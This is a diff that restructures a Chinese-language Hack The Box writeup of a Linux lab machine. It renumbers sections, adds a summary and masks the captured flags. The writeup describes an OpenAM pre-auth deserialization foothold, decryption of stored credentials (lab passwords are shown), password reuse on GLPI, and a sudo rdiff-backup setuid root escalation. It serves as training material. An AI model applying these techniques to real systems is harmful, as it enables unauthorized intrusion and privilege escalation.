@@ -8,14 +8,21 @@ categories: ["Writeup"]
 isStarred: false
 ---
 
-| | |
-|---|---|
+Management 是一台 Easy 难度的 Linux 机器。前端 bundle 经 AES-GCM 加密后 eval，解出的 Client login 通向 OpenAM，用 CVE-2026-33439 拿到立足点；再从 OpenAM 配置解出凭据，密码在 GLPI 上复用，最后用 sudo rdiff-backup 的参数覆盖提权到 root。
+
+| 项目 | 值 |
+| :--- | :--- |
+| 平台 | Hack The Box |
 | 系统 | Linux（Ubuntu 24.04.5，kernel 6.8.0-139） |
 | 难度 | Easy |
 | 靶机 IP | 10.129.5.96 |
 | 日期 | 2026-10-19 |
 
-## 0. 侦察
+## 0. 攻击链总览
+
+单机靶机。入口是 OpenAM 的预认证反序列化，凭据链从 OpenAM 配置传到 GLPI，最后落在 sudo 通配符上。
+
+## 1. 侦察
 
 ```console
 imawuya:~$ nmap -Pn -sT -p22,80,443,50389 --min-rate 2000 10.129.5.96
@@ -45,7 +52,7 @@ https://sso.management.htb/
 
 vhost 枚举只命中 `sso`，站点是 OpenAM 16.0.5（Open Identity Platform）。
 
-## 1. 初始立足：CVE-2026-33439
+## 2. 初始访问：CVE-2026-33439
 
 OpenAM ≤ 16.0.5 的 `jato.clientSession` 参数存在预认证 Java 反序列化。CVE-2021-35464 之后官方加了 `WhitelistObjectInputStream`，这个洞绕过了白名单。
 
@@ -73,11 +80,11 @@ uid=996(openam) gid=... groups=...
 
 产物：`exploits/cve-2026-33439/exploit.py` 与 `nuclei.yaml`。
 
-## 2. 从 OpenAM 配置里解凭据
+## 3. 从 OpenAM 配置里解凭据
 
 `openam` 用户能读整个 OpenAM 目录，包括 **配置存储** 和 **OpenDJ 数据目录**。两条线同时走：
 
-### 2.1 离线导出 OpenDJ
+### 3.1 离线导出 OpenDJ
 
 ```console
 openam@management:/opt/openam$ cp -a config/opends /tmp/opends
@@ -88,7 +95,7 @@ Exported 583 entries
 
 导出 583 条记录，其中带 `userPassword` 密文。
 
-### 2.2 解 `am.encryption.pwd`
+### 3.2 解 `am.encryption.pwd`
 
 配置里能直接读到 `am.encryption.pwd`。它保护的是 OpenAM 的配置项密码。直接静态调用 `JCECrypt.decode` 会因为缺少初始化上下文返回 `null`，最短路径是把一个 JSP 部署到 webapp 里，在运行中的容器内调用：
 
@@ -100,7 +107,7 @@ cn=Directory Manager / rCi5i6A7zqAf
 amAdmin              / dnnWCs5e6+d5+P1YZ3fL8rCE6IE=
 ```
 
-### 2.3 Directory Manager 绑定
+### 3.3 Directory Manager 绑定
 
 ```console
 imawuya:~$ ldapsearch -x -H ldap://10.129.5.96:50389 \
@@ -111,7 +118,7 @@ imawuya:~$ ldapsearch -x -H ldap://10.129.5.96:50389 \
 
 身份库很小，只有 `demo` 一个账号，没有 `owen`。`demo` 的 SSHA 用字典跑出 `changeit`，与本条路径无关，只说明身份库和系统账号是两套。
 
-## 3. GLPI 与被复用的密码
+## 4. GLPI 与被复用的密码
 
 OpenAM 所在主机同时跑着 GLPI。配置文件可读：
 
@@ -138,10 +145,10 @@ owen@management:~$ id
 uid=1000(owen) gid=1000(owen) groups=1000(owen) ...
 
 owen@management:~$ cat user.txt
-1b183f3aa8521ced7ff521f096eb45c5
+********************************
 ```
 
-## 4. 提权：sudo rdiff-backup 参数覆盖
+## 5. 提权：sudo rdiff-backup 参数覆盖
 
 ```console
 owen@management:~$ sudo -l
@@ -180,10 +187,10 @@ cn.os.chmod(path, 0o4755)
 ```console
 owen@management:~$ /tmp/rootbash -p -c 'id; cat /root/root.txt'
 uid=1000(owen) gid=1000(owen) euid=0(root) ...
-6e3b757550464314b547010ba42a0bad
+********************************
 ```
 
-## 5. 收尾
+## 6. 收尾
 
 清理掉的落地文件与进程：
 
@@ -201,7 +208,7 @@ uid=1000(owen) gid=1000(owen) euid=0(root) ...
 bind shell 进程（4447 已关闭）
 ```
 
-## 附：走过的弯路与兔子洞
+## 附录：走过的弯路与兔子洞
 
 1. **全端口扫描超时**：`-p- --host-timeout 600s` 跑满 10 分钟只拿到一句 `Skipping host ... due to host timeout`，扫描文件是空的。改用指定端口 + 提高 `--min-rate` 才拿到 22/80/443/50389。
 2. **匿名 LDAP 绑定**：50389 允许匿名 bind，但 ACL 拒绝读取任何条目。看起来像入口，实际只能用 Directory Manager 或服务账号。
